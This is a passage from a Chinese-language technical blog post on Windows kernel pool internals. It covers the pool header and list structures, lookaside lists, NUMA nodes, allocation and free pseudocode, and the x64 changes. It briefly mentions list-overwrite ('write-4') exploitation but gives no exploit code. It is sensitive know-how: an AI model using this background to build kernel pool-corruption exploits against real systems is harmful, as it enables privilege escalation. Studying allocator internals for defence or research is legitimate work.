size来计算下标，计算方式就是乘8除8然后四舍五入，BlockSize = (NumberOfBytes+0xF) &gt;&gt; 3。进行这些操作是为了给pool header预留空间</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">POOL_HEADER</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-comment">/*0x000*/</span> UINT16 PreviousSize : <span class="hljs-number">9</span>;<br><span class="hljs-comment">/*0x000*/</span> UINT16 PoolIndex : <span class="hljs-number">7</span>;<br><span class="hljs-comment">/*0x002*/</span> UINT16 BlockSize : <span class="hljs-number">9</span>;<br><span class="hljs-comment">/*0x002*/</span> UINT16 PoolType : <span class="hljs-number">7</span>;<br>&#125;;<br><span class="hljs-comment">/*0x000*/</span> ULONG32 Ulong1;<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-comment">/*0x004*/</span> ULONG32 PoolTag;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-comment">/*0x004*/</span> UINT16 AllocatorBackTraceIndex;<br><span class="hljs-comment">/*0x006*/</span> UINT16 PoolTagHash;<br>&#125;;<br>&#125;;<br>&#125; POOL_HEADER, *PPOOL_HEADER;<br></code></pre></td></tr></table></figure><p>pool header存放了用于内存释放和分配算法必要的信息，比如PreviousSize表示前一个堆块的大小，可以用于定位前一个堆块，在合并堆块的时候。如果该堆块位于页的开头，这个可以为0.</p><p>poolindex表示下标，用来确保被释放到正确的index处。</p><p>pooltype表示堆块类型（paged nopaged等）同时也表明是否free，free的chunk会置0，否则置为POOL_TYPE or pool-in-use</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">enum</span> _<span class="hljs-title">POOL_TYPE</span></span><br><span class="hljs-class">&#123;</span><br>NonPagedPool = <span class="hljs-number">0</span> <span class="hljs-comment">/*0x0*/</span>,<br>PagedPool = <span class="hljs-number">1</span> <span class="hljs-comment">/*0x1*/</span>,<br>NonPagedPoolMustSucceed = <span class="hljs-number">2</span> <span class="hljs-comment">/*0x2*/</span>,<br>DontUseThisType = <span class="hljs-number">3</span> <span class="hljs-comment">/*0x3*/</span>,<br>NonPagedPoolCacheAligned = <span class="hljs-number">4</span> <span class="hljs-comment">/*0x4*/</span>,<br>PagedPoolCacheAligned = <span class="hljs-number">5</span> <span class="hljs-comment">/*0x5*/</span>,<br>NonPagedPoolCacheAlignedMustS = <span class="hljs-number">6</span> <span class="hljs-comment">/*0x6*/</span>,<br>MaxPoolType = <span class="hljs-number">7</span> <span class="hljs-comment">/*0x7*/</span>,<br>NonPagedPoolSession = <span class="hljs-number">32</span> <span class="hljs-comment">/*0x20*/</span>,<br>PagedPoolSession = <span class="hljs-number">33</span> <span class="hljs-comment">/*0x21*/</span>,<br>NonPagedPoolMustSucceedSession = <span class="hljs-number">34</span> <span class="hljs-comment">/*0x22*/</span>,<br>DontUseThisTypeSession = <span class="hljs-number">35</span> <span class="hljs-comment">/*0x23*/</span>,<br>NonPagedPoolCacheAlignedSession = <span class="hljs-number">36</span> <span class="hljs-comment">/*0x24*/</span>,<br>PagedPoolCacheAlignedSession = <span class="hljs-number">37</span> <span class="hljs-comment">/*0x25*/</span>,<br>NonPagedPoolCacheAlignedMustSSession = <span class="hljs-number">38</span> <span class="hljs-comment">/*0x26*/</span><br>&#125; POOL_TYPE, *PPOOL_TYPE;<br></code></pre></td></tr></table></figure><p>pool-in-use在vista及之后版本是2，在xp和2003上是4</p><p>例,在win7上 使用中的paged pool chunk    </p><p>PoolType = PagedPool|2 = 3</p><p>如果chunk被free了并且加入ListHeads链表，poolheader下面就是LIST_ENTRY，因为这个原因，block size为8字节的chunk不被listheads维护，因为size不够放LIST_ENTRY。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">LIST_ENTRY</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-comment">/*0x000*/</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">LIST_ENTRY</span>* <span class="hljs-title">Flink</span>;</span><br><span class="hljs-comment">/*0x004*/</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">LIST_ENTRY</span>* <span class="hljs-title">Blink</span>;</span><br>&#125; LIST_ENTRY, *PLIST_ENTRY;<br></code></pre></td></tr></table></figure><p>_LIST_ENTRY用于吧chunk加入双向链表。以前内存破坏类的漏洞利用不管是在用户态还是在内核态都是用类似的方法，”write-4” exploitation。简单来说就是覆盖list，然后可以达成任意地址分配内存，类似linux中的pwn。</p><p>对于小堆块，内核用lookaside单向链表来实现快速分配和释放 (LIFO方式)。这设计主要是用于cpu密集型，并用了原子操作来进行add和remove entries的操作。为了更好的使用cpu缓存lookaside lists在每个处理器的kpcrb中定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">KPRCB</span></span><br><span class="hljs-class">&#123;</span><br>...<br><span class="hljs-comment">/*0x5A0*/</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">PP_LOOKASIDE_LIST</span> <span class="hljs-title">PPLookasideList</span>[16];</span><br><span class="hljs-comment">/*0x620*/</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">GENERAL_LOOKASIDE_POOL</span> <span class="hljs-title">PPNPagedLookasideList</span>[32];</span><br><span class="hljs-comment">/*0xF20*/</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">GENERAL_LOOKASIDE_POOL</span> <span class="hljs-title">PPPagedLookasideList</span>[32];</span><br>...<br>&#125; KPRCB, *PKPRCB;<br></code></pre></td></tr></table></figure><p>分页和非分页的lookaside list都在里面定义了。</p><p>固定且经常使用的大小会在PPLookasideList中，这是个特殊的专用的lookaside list</p><p>对于非分页和分页的lookaside lists，最大的块大小为0x20，因此每个类型的有32种。每个列表由GENERAL LOOKASIDE POOL 定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">GENERAL_LOOKASIDE_POOL</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-comment">/*0x000*/</span> <span class="hljs-class"><span class="hljs-keyword">union</span> _<span class="hljs-title">SLIST_HEADER</span> <span class="hljs-title">ListHead</span>;</span><br><span class="hljs-comment">/*0x000*/</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">SINGLE_LIST_ENTRY</span> <span class="hljs-title">SingleListHead</span>;</span><br>&#125;;<br><span class="hljs-comment">/*0x008*/</span> UINT16 Depth;<br><span class="hljs-comment">/*0x00A*/</span> UINT16 MaximumDepth;<br><span class="hljs-comment">/*0x00C*/</span> ULONG32 TotalAllocates;<br><span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-comment">/*0x010*/</span> ULONG32 AllocateMisses;<br><span class="hljs-comment">/*0x010*/</span> ULONG32 AllocateHits;<br>&#125;;<br><span class="hljs-comment">/*0x014*/</span> ULONG32 TotalFrees;<br><span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-comment">/*0x018*/</span> ULONG32 FreeMisses;<br><span class="hljs-comment">/*0x018*/</span> ULONG32 FreeHits;<br>&#125;;<br><span class="hljs-comment">/*0x01C*/</span> <span class="hljs-class"><span class="hljs-keyword">enum</span> _<span class="hljs-title">POOL_TYPE</span> <span class="hljs-title">Type</span>;</span><br><span class="hljs-comment">/*0x020*/</span> ULONG32 Tag;<br><span class="hljs-comment">/*0x024*/</span> ULONG32 Size;<br><span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-comment">/*0x028*/</span> PVOID AllocateEx;<br><span class="hljs-comment">/*0x028*/</span> PVOID Allocate;<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-comment">/*0x02C*/</span> PVOID FreeEx;<br><span class="hljs-comment">/*0x02C*/</span> PVOID Free;<br>&#125;;<br><span class="hljs-comment">/*0x030*/</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">LIST_ENTRY</span> <span class="hljs-title">ListEntry</span>;</span><br><span class="hljs-comment">/*0x038*/</span> ULONG32 LastTotalAllocates;<br><span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-comment">/*0x03C*/</span> ULONG32 LastAllocateMisses;<br><span class="hljs-comment">/*0x03C*/</span> ULONG32 LastAllocateHits;<br>&#125;;<br><span class="hljs-comment">/*0x040*/</span> ULONG32 Future[<span class="hljs-number">2</span>];<br>&#125; GENERAL_LOOKASIDE_POOL, *PGENERAL_LOOKASIDE_POOL;<br><br></code></pre></td></tr></table></figure><p>SingleListHead.Next指向第一个被free的chunk，链表大小被Depth限制平衡管理器会定期调整，根据内存页的命中率，所以一个经常被访问的lookaside list的Depth值会很大，Depth初始值为4 (nt!ExMinimumLookasideDepth)，最大为256，如果lookaside list满了，pool chunk会被分配到合适的listheads里去。</p><p>session pool也有lookaside lists，paged session pool分配，使用单独的lookaside lists(nt!ExpSessionPoolLookaside)每个列表block size最大为0x19，由 nt!ExpSessionPoolSmallLists设置。session pool的lookaside list同样用了上述GENERAL LOOKASIDE POOL结构体，但是有了额外的填充。对于非分页的session pool，使用的lookaside lists和非分页内存的一样。</p><p>lookaside lists在hot/cold page separation pool flag 被设置为 (nt!ExpPoolFlags &amp; 0x100).会被禁用。</p><p>下面讲下large pool的分配。其实打过pwn的入门这玩意并没多大困难，很多思想都是一样的。</p><p>池描述符里的ListHeads维护的大小都小于一个页。当分配大小超过4080字节时会使用nt!ExpAllocateBigPool来处理，这和函数会继续调用nt!MiAllocatePoolPages,他将四舍五入计算size到最近的页大小。一个有着1 block size和0presize的large pool会被立刻分配。large pool分配完后，多余的内存会被插入到合适的池描述符ListHeads最后</p><p>关于numa</p><p><strong>非统一内存访问（NUMA）</strong>是一种用于多处理器的<a href="https://baike.baidu.com/item/%E7%94%B5%E8%84%91">电脑</a>内存体设计，内存访问时间取决于处理器的内存位置。 在NUMA下，处理器访问它自己的本地存储器的速度比非本地存储器（存储器的地方到另一个处理器之间共享的处理器或存储器）快一些。</p><p>处理器和内存被分组在一个叫做节点的单元中，结构体定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">KNODE</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-comment">/*0x000*/</span> <span class="hljs-class"><span class="hljs-keyword">union</span> _<span class="hljs-title">SLIST_HEADER</span> <span class="hljs-title">PagedPoolSListHead</span>;</span><br><span class="hljs-comment">/*0x008*/</span> <span class="hljs-class"><span class="hljs-keyword">union</span> _<span class="hljs-title">SLIST_HEADER</span> <span class="hljs-title">NonPagedPoolSListHead</span>[3];</span><br><span class="hljs-comment">/*0x020*/</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">GROUP_AFFINITY</span> <span class="hljs-title">Affinity</span>;</span><br><span class="hljs-comment">/*0x02C*/</span> ULONG32 ProximityId;<br><span class="hljs-comment">/*0x030*/</span> UINT16 NodeNumber;<br><span class="hljs-comment">/*0x032*/</span> UINT16 PrimaryNodeNumber;<br><span class="hljs-comment">/*0x034*/</span> UINT8 MaximumProcessors;<br><span class="hljs-comment">/*0x035*/</span> UINT8 Color;<br><span class="hljs-comment">/*0x036*/</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">flags</span> <span class="hljs-title">Flags</span>;</span><br><span class="hljs-comment">/*0x037*/</span> UINT8 NodePad0;<br><span class="hljs-comment">/*0x038*/</span> ULONG32 Seed;<br><span class="hljs-comment">/*0x03C*/</span> ULONG32 MmShiftedColor;<br><span class="hljs-comment">/*0x040*/</span> ULONG32 FreeCount[<span class="hljs-number">2</span>];<br><span class="hljs-comment">/*0x048*/</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">CACHED_KSTACK_LIST</span> <span class="hljs-title">CachedKernelStacks</span>;</span><br><span class="hljs-comment">/*0x060*/</span> LONG32 ParkLock;<br><span class="hljs-comment">/*0x064*/</span> ULONG32 NodePad1;<br><span class="hljs-comment">/*0x068*/</span> UINT8 _PADDING0_[<span class="hljs-number">0x18</span>];<br>&#125; KNODE, *PKNODE;<br><br></code></pre></td></tr></table></figure><p>每个节点都由四个lookaside单向链表。这个链表主要服务于那些经常被访问的内存（计数器大）</p><p>对于分页内存，每个节点定义了一个lookaside list (PagedPoolSListHead) </p><p>对于非分页内存，定义了三个 (NonPagedPoolSListHead[3])</p><p>lookaside list的大小由系统的物理内存决定。</p><p>如果lookaside list不能用，就会使用比特位图allocation bitmap（RTL BITMAP），每个位都表示了当前大小的页是否在使用。</p><p>pagedpool中的bitmap在nt!MmPagedPoolInfo指向的MM_PAGED_POOL_INFO中定义</p><p>non-pagedpool中的bitmap在nt!MiNonPagedPoolBitMap指向结构体中定义</p><p>session pool的在MM_SESSION_SPACE结构体中定义。 </p><p>对于大多数large pool的分配 nt!ExAllocatePoolWithTag需要提供额外4字节(64位下是8字节)来存放size（位于pool body最后），当free时(ExFreePoolWithTag)该值会被检查来防止pool overflow。</p><h1 id="Allocation-Free-Algorithm"><a href="#Allocation-Free-Algorithm" class="headerlink" title="Allocation/Free Algorithm"></a>Allocation/Free Algorithm</h1><p>关于ExAllocatePoolWithTag</p><p><img src="image-20220312005121553.png" alt="image-20220312005121553"></p><p>先访问lookaside lists没有就ListHeads lists如果还没有就会像分配器请求一个页.</p><p>如果是large pool，操作系统为了减少内存碎片，另一部分块取决于页面位置，如果页面对其，就会从前一个页来分配，否则从后面分配，无论是哪种方式，剩下的内存都会被放入ListHeads链表尾部。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c">PVOID<br>ExAllocatePoolWithTag( POOL_TYPE PoolType,<br>SIZE_T NumberOfBytes,<br>ULONG Tag)<br><span class="hljs-comment">// call pool page allocator if size is above 4080 bytes</span><br><span class="hljs-keyword">if</span> (NumberOfBytes &gt; <span class="hljs-number">0xff0</span>) &#123;<br><span class="hljs-comment">// call nt!ExpAllocateBigPool</span><br>&#125;<br><span class="hljs-comment">// attempt to use lookaside lists</span><br><span class="hljs-keyword">if</span> (PoolType &amp; PagedPool) &#123;<br><span class="hljs-keyword">if</span> (PoolType &amp; SessionPool &amp;&amp; BlockSize &lt;= <span class="hljs-number">0x19</span>) &#123;<br><span class="hljs-comment">// try the session paged lookaside list</span><br><span class="hljs-comment">// return on success</span><br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (BlockSize &lt;= <span class="hljs-number">0x20</span>) &#123;<br><span class="hljs-comment">// try the per-processor paged lookaside list</span><br><span class="hljs-comment">// return on success</span><br>&#125;<br><span class="hljs-comment">// lock paged pool descriptor (round robin or local node)</span><br>&#125;<br><span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// NonPagedPool</span><br><span class="hljs-keyword">if</span> (BlockSize &lt;= <span class="hljs-number">0x20</span>) &#123;<br><span class="hljs-comment">// try the per-processor non-paged lookaside list</span><br><span class="hljs-comment">// return on success</span><br>&#125;<br><span class="hljs-comment">// lock non-paged pool descriptor (local node)</span><br>&#125;<br><span class="hljs-comment">// attempt to use listheads lists</span><br><span class="hljs-keyword">for</span> (n = BlockSize<span class="hljs-number">-1</span>; n &lt; <span class="hljs-number">512</span>; n++) &#123;<br><span class="hljs-keyword">if</span> (ListHeads[n].Flink == &amp;ListHeads[n]) &#123; <span class="hljs-comment">// empty</span><br><span class="hljs-keyword">continue</span>; <span class="hljs-comment">// try next block size</span><br>&#125;<br><span class="hljs-comment">// safe unlink ListHeads[n].Flink</span><br><span class="hljs-comment">// split if larger than needed</span><br><span class="hljs-comment">// return chunk</span><br>&#125;<br><span class="hljs-comment">// no chunk found, call nt!MiAllocatePoolPages</span><br><span class="hljs-comment">// split page and return chunk</span><br></code></pre></td></tr></table></figure><p>关于ExFreePoolWithTag</p><p><img src="image-20220312005145088.png" alt="image-20220312005145088"></p><p>主要操作是吧free的chunk放到正确的list中，同时操作系统为了减少内存碎片会判断周围的堆块是否空闲，如空闲进行合并操作。伪代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c">VOID<br>ExFreePoolWithTag( PVOID Entry,<br>ULONG Tag)<br><span class="hljs-keyword">if</span> (PAGE_ALIGNED(Entry)) &#123;<br><span class="hljs-comment">// call nt!MiFreePoolPages</span><br><span class="hljs-comment">// return on success</span><br>&#125;<br><span class="hljs-keyword">if</span> (Entry-&gt;BlockSize != NextEntry-&gt;PreviousSize)<br>BugCheckEx(BAD_POOL_HEADER);<br><span class="hljs-keyword">if</span> (Entry-&gt;PoolType &amp; SessionPagedPool &amp;&amp; Entry-&gt;BlockSize &lt;= <span class="hljs-number">0x19</span>) &#123;<br><span class="hljs-comment">// put in session pool lookaside list</span><br><span class="hljs-comment">// return on success</span><br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (Entry-&gt;BlockSize &lt;= <span class="hljs-number">0x20</span>) &#123;<br><span class="hljs-keyword">if</span> (Entry-&gt;PoolType &amp; PagedPool) &#123;<br><span class="hljs-comment">// put in per-processor paged lookaside list</span><br><span class="hljs-comment">// return on success</span><br>&#125;<br><span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// NonPagedPool</span><br><span class="hljs-comment">// put in per-processor non-paged lookaside list</span><br><span class="hljs-comment">// return on success</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (ExpPoolFlags &amp; DELAY_FREE) &#123; <span class="hljs-comment">// 0x200</span><br><span class="hljs-keyword">if</span> (PendingFreeDepth &gt;= <span class="hljs-number">0x20</span>) &#123;<br><span class="hljs-comment">// call nt!ExDeferredFreePool</span><br>&#125;<br><span class="hljs-comment">// add Entry to PendingFrees list</span><br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> (IS_FREE(NextEntry) &amp;&amp; !PAGE_ALIGNED(NextEntry)) &#123;<br><span class="hljs-comment">// safe unlink next entry</span><br><span class="hljs-comment">// merge next with current chunk</span><br>&#125;<br><span class="hljs-keyword">if</span> (IS_FREE(PreviousEntry)) &#123;<br><span class="hljs-comment">// safe unlink previous entry</span><br><span class="hljs-comment">// merge previous with current chunk</span><br>&#125;<br><span class="hljs-keyword">if</span> (IS_FULL_PAGE(Entry))<br><span class="hljs-comment">// call nt!MiFreePoolPages</span><br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">// insert Entry to ListHeads[BlockSize - 1]</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>DELAY_FREE标志（nt!ExpPoolFlags &amp; 0x200）可以优化几个堆块的分配与释放。如果可用的物理内存(nt!MmNumberOfPhysicalPages)大于等于0x1fc00.每一次调用ExFreePoolWithTag都会要释放的堆块放到PendingFrees列表中，具体到每个池描述符。如果列表有32个或者更多的chunk(determined by PendingFreeDepth)，他将调用ExDeferredFreePool，这个函数会遍历然后把所有的chunk释放到适当的ListHeads列表中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c">VOID<br>ExDeferredFreePool( PPOOL_DESCRIPTOR PoolDesc,<br>BOOLEAN bMultipleThreads)<br><span class="hljs-function"><span class="hljs-keyword">for</span> <span class="hljs-title">each</span> <span class="hljs-params">(Entry in PendingFrees)</span> </span>&#123;<br><span class="hljs-keyword">if</span> (IS_FREE(NextEntry) &amp;&amp; !PAGE_ALIGNED(NextEntry)) &#123;<br><span class="hljs-comment">// safe unlink next entry</span><br><span class="hljs-comment">// merge next with current chunk</span><br>&#125;<br><span class="hljs-keyword">if</span> (IS_FREE(PreviousEntry)) &#123;<br><span class="hljs-comment">// safe unlink previous entry</span><br><span class="hljs-comment">// merge previous with current chunk</span><br>&#125;<br><span class="hljs-keyword">if</span> (IS_FULL_PAGE(Entry))<br><span class="hljs-comment">// add to full page list</span><br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">// insert Entry to ListHeads[BlockSize - 1]</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">for</span> each (page in full page <span class="hljs-built_in">list</span>) &#123;<br><span class="hljs-comment">// call nt!MiFreePoolPages</span><br>&#125;<br></code></pre></td></tr></table></figure><p>关于64位</p><p>//AMD64/x64 Kernel Pool Changes</p><p>除了支持更大的物理内存。64位下的windows kernel pool和32位并没有太大区别。</p><p>主要还是一些结构体成员大小的变化，如指针大小还有block size扩大到16字节计算方式同样改变</p><p>s BlockSize = (NumberOfBytes+0x1F) &gt;&gt; 4</p><p>对应的pool header也改变了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">POOL_HEADER</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-comment">/*0x000*/</span> ULONG32 PreviousSize : <span class="hljs-number">8</span>;<br><span class="hljs-comment">/*0x000*/</span> ULONG32 PoolIndex : <span class="hljs-number">8</span>;<br><span class="hljs-comment">/*0x000*/</span> ULONG32 BlockSize : <span class="hljs-number">8</span>;<br><span class="hljs-comment">/*0x000*/</span> ULONG32 PoolType : <span class="hljs-number">8</span>;<br>&#125;;<br><span class="hljs-comment">/*0x000*/</span> ULONG32 Ulong1;<br>&#125;;<br><span class="hljs-comment">/*0x004*/</span> ULONG32 PoolTag;<br><span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-comment">/*0x008*/</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">EPROCESS</span>* <span class="hljs-title">ProcessBilled</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-comment">/*0x008*/</span> UINT16 AllocatorBackTraceIndex;<br><span class="hljs-comment">/*0x00A*/</span> UINT16 PoolTagHash;<br><span class="hljs-comment">/*0x00C*/</span> UINT8 _PADDING0_[<span class="hljs-number">0x4</span>];<br>&#125;;<br>&#125;;<br>&#125; POOL_HEADER, *PPOOL_HEADER;<br></code></pre></td></tr></table></figure><p>因为block size大小的改变，PreviousSize和BlockSize都减小到了8bits即1字节,ListHeads有256个双向链表数组而不是像x86上是512个。这也允许给PoolIndex额外分配一个比特位，因此64位下支持256节点(池描述符)，而不是像x86下的128个。另外pool header也扩大到16字节并且包括了ProcessBilled指针用于定位是那个进程使用的这个内存。在32位下这个指针存储与pool body的最后四个字节。</p><h1 id="conclusion"><a href="#conclusion" class="headerlink" title="conclusion"></a>conclusion</h1><p>内核池分配几种类型，都定义在POOL_TYPE中(Non-Paged Pools, Paged Pools, Session Pools, etc)</p><p>每种内核池都有一个描述符（POOL_DESCRIPTOR）用来记录分配/释放的块数目，正在使用中的页等等。还维护了一系列的chunks。</p><h2 id="Non-Paged-Pool"><a href="#Non-Paged-Pool" class="headerlink" title="Non-Paged Pool"></a>Non-Paged 